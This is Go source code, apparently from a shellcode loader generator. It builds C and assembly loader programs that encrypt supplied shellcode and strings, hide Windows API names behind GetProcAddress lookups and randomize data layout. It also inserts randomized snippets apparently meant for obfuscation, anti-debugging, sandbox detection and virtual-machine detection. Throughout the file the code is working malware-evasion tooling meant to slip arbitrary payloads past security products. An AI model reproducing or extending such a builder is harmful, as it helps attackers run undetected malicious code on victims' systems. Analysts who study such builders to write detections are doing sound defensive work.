package main

import (
	"fmt"
	"regexp"
	"strings"

	"github.com/google/uuid"
)

type DataDefine struct {
	offset int
	value  string
	data   []byte
}

func generateCode(code string, table map[string]SnippetsMap, shell []byte) string {
	dataDefs := map[string]*DataDefine{
		NAME_API_KERNEL:           {0, VALUE_API_KERNEL, nil},
		NAME_API_GET_PROC_ADDRESS: {0, VALUE_GET_PROC_ADDRESS, nil},
	}

	// Fill header, API and shellcode
	code = fillCodePass1(code, len(shell) > 0)

	// Fill the snippet calls:
	// * First fill the named snippets to distribute them evenly, then the random ones
	// * Fill the snippet calls both in the main code and within C-snippets
	fillCSnippets(table, true)
	code = fillSnippetCalls(code, table, LANG_MASK_ALL, true)
	fillCSnippets(table, false)
	code = fillSnippetCalls(code, table, LANG_MASK_ALL, false)

	// Fill the C-snippet function definitions
	code = strings.Replace(code, "{{c-snippets}}", generateSnippetFuncs(table, LANG_C), 1)

	// Fill API, string and caller calls
	code = fillCodePass2(code, dataDefs)

	// Fill defines, variables, values and ASM-snippet functions
	code = fillCodePass3(code, dataDefs, table, shell)

	return code
}

func loadCode(name string) string {
	return loadFile(fmt.Sprintf(TPL_CODE_FILE, *workingDir, name))
}

func fillCodePass1(code string, hasShell bool) string {
	var shell string
	var shellExec string
	if hasShell {
		shell = loadCode("shell")
		shellExec = CODE_SHELL_CALL
	} else {
		shell = "/* Shellcode not provided */"
		shellExec = "/* TODO: Please provide shellcode */"
	}

	header := loadCode("header")
	r := regexp.MustCompile(`{{(api|shell)}}`)
	header = r.ReplaceAllStringFunc(header, func(str string) string {
		if str == "{{api}}" {
			return loadCode("api")
		}
		return shell
	})

	r = regexp.MustCompile(`{{(header|shell-exec)}}`)
	return r.ReplaceAllStringFunc(code, func(str string) string {
		if str == "{{header}}" {
			return header
		}
		return shellExec
	})
}

func fillCodePass2(code string, defs map[string]*DataDefine) string {
	cnt := 0

	// Since the second group can contain any characters, we stop the search when the substring "}}" appears.
	// Golang regexp does not currently support the statement "?!": `{{(api|str|caller)-(((?!}}).)+)}}`
	r := regexp.MustCompile(`{{(api|str|caller)-(((\\\{|\\\}|)[^{}]*)+)}}`)
	return r.ReplaceAllStringFunc(code, func(str string) string {
		groups := r.FindStringSubmatch(str)
		group := groups[2]
		var call string

		switch groups[1] {
		case "api":
			call = generateApiCall(group, defs)
		case "str":
			call = generateStringCall(group, &cnt, defs)
		default:
			call = generateCaller(group)
		}

		if len(call) > 0 {
			return call
		}
		return str
	})
}

func generateApiCall(str string, defs map[string]*DataDefine) string {
	r := regexp.MustCompile(`^(0|n):([0-9a-zA-Z_]+)$`)
	groups := r.FindStringSubmatch(str)
	if len(groups) < 2 {
		return ""
	}

	key := fmt.Sprintf(TPL_API_PROC_NAME, groups[2])
	if _, ok := defs[key]; !ok {
		defs[key] = &DataDefine{0, groups[2], nil}
	}

	var tpl string
	if groups[1] == "0" {
		tpl = TPL_API_CALL_0
	} else {
		tpl = TPL_API_CALL_N
	}
	return fmt.Sprintf(tpl, key)
}

func generateStringCall(str string, cnt *int, defs map[string]*DataDefine) string {
	r := regexp.MustCompile(`^(alloc|realloc|free):([0-9a-zA-Z_]+)($|:(.*)$)`)
	groups := r.FindStringSubmatch(str)
	if len(groups) < 4 {
		return ""
	}

	call := groups[1]
	if call == "free" {
		if groups[3] == "" {
			return fmt.Sprintf(TPL_STRING_FREE, groups[2])
		}
		return ""
	}

	name := groups[2]
	value := strings.ReplaceAll(strings.ReplaceAll(groups[4], "\\{", "{"), "\\}", "}")
	key := fmt.Sprintf(TPL_STRING_NAME, *cnt, name)
	defs[key] = &DataDefine{0, value, nil}
	*cnt++

	var tpl string
	if call == "alloc" {
		tpl = TPL_STRING_ALLOC
	} else {
		tpl = TPL_STRING_REALLOC
	}
	return fmt.Sprintf(tpl, key, name)
}

func generateCaller(str string) string {
	r := regexp.MustCompile(`^[0-9a-zA-Z-]+$`)
	groups := r.FindStringSubmatch(str)
	if len(groups) < 1 {
		return ""
	}

	switch groups[0] {
	case "init":
		return CODE_CALLER_INIT
	case "var":
		return CODE_CALLER_VAR
	case "ptr":
		return CODE_CALLER_PTR
	case "decl-var":
		return CODE_CALLER_DECL_VAR
	case "decl-ptr":
		return CODE_CALLER_DECL_PTR
	case "cast":
		return CODE_CALLER_CAST
	default:
		return ""
	}
}

func fillCodePass3(code string, dataDefs map[string]*DataDefine, table map[string]SnippetsMap, shell []byte) string {
	// Add encryption defines
	customDefs := map[string]any{
		NAME_API_KEY_SIZE: encryptStrings(dataDefs),
	}
	if len(shell) > 0 {
		customDefs[NAME_SHELL_SIZE] = encryptShellcode(dataDefs, shell)
	}

	r := regexp.MustCompile(`{{(data|data-defs|custom-defs|asm-snippets|value:([a-z]+))}}`)
	return r.ReplaceAllStringFunc(code, func(str string) string {
		switch str {
		case "{{data}}":
			// Fill the data variable with encrypted strings
			return generateData(dataDefs)
		case "{{data-defs}}":
			// Fill the definitions for encrypted strings
			return generateDefs(dataDefs, func(k string, v *DataDefine) string {
				return fmt.Sprintf(TPL_DATA_DEFINE, k, v.offset)
			})
		case "{{custom-defs}}":
			// Fill the definitions for additional constants
			return generateDefs(customDefs, func(k string, v any) string {
				return fmt.Sprintf(TPL_CUSTOM_DEFINE, k, v)
			})
		case "{{asm-snippets}}":
			// Fill the ASM-snippet function definitions on the last pass as they generate a lot of code
			return generateSnippetFuncs(table, LANG_ASM)
		default:
			// Fill the code with random values
			groups := r.FindStringSubmatch(str)
			return generateValues(groups[2])
		}
	})
}

func generateData(defs map[string]*DataDefine) string {
	const interval = 32

	var list []string
	for name := range defs {
		list = append(list, name)
	}

	bts := randBytes(1 + randInt(interval))
	for len(list) > 0 {
		// Randomize string offsets
		i := randInt(len(list))
		def := defs[list[i]]
		def.offset = len(bts)
		bts = append(append(bts, def.data...), randBytes(1+randInt(interval))...)
		list = remove(list, i)
	}
	bts = append(bts, randBytes(1+randInt(interval))...)

	return formatBytesToCStrings(bts)
}

func generateDefs[V any](defs map[string]V, generate func(string, V) string) string {
	var sb strings.Builder

	for _, key := range sortedKeys(defs) {
		if sb.Len() > 0 {
			sb.WriteString(fmt.Sprintln())
		}
		sb.WriteString(generate(key, defs[key]))
	}

	return sb.String()
}

func generateValues(typ string) string {
	switch typ {
	case "byte":
		return fmt.Sprintf("%d", randInt(256))
	case "uuid":
		return strings.Replace(uuid.NewString(), "-", "", -1)
	case "guid":
		return fmt.Sprintf("{%s}", uuid.NewString())
	default:
		return typ
	}
}

func fillCSnippets(table map[string]SnippetsMap, named bool) {
	for _, snippets := range table {
		for _, snippet := range snippets {
			if snippet.template.lang != LANG_C {
				continue
			}
			for _, variant := range snippet.variants {
				variant.code = fillSnippetCalls(variant.code, table, LANG_ASM, named)
			}
		}
	}
}

func fillSnippetCalls(code string, table map[string]SnippetsMap, langMask Lang, named bool) string {
	var tpl string
	if named {
		tpl = `[0-9a-zA-Z_,]+`
	} else {
		tpl = `\*`
	}

	r := regexp.MustCompile(fmt.Sprintf("{{(obf|dbg|snd|vmd):(%s)}}", tpl))
	return r.ReplaceAllStringFunc(code, func(str string) string {
		groups := r.FindStringSubmatch(str)

		snippets, ok := table[groups[1]]
		if !ok {
			return str
		}

		var variant *Variant
		var snippet *Snippet

		names := groups[2]
		if names == "*" {
			variant, snippet = snippets.RandomVariant(langMask)
		} else {
			variant, snippet = snippets.OneOfVariant(strings.Split(names, ","), langMask)
		}

		if variant == nil {
			return str
		}
		return fmt.Sprintf(snippet.template.lang.CallFormat(), variant.name)
	})
}

func generateSnippetFuncs(table map[string]SnippetsMap, lang Lang) string {
	var sb strings.Builder

	// Sort snippets by type
	for _, typ := range snippetTypes {
		snippets := table[typ.String()]

		// Sort snippets by name
		for _, key := range sortedKeys(snippets) {
			snippet := snippets[key]
			if snippet.template.lang != lang {
				continue
			}

			// Sort snippets by variant
			for _, key := range sortedKeys(snippet.variants) {
				variant := snippet.variants[key]
				if variant.count == 0 {
					continue
				}

				if sb.Len() > 0 {
					sb.WriteString(fmt.Sprintln())
					sb.WriteString(fmt.Sprintln())
				}
				sb.WriteString(variant.code)
			}
		}
	}

	return sb.String()
}
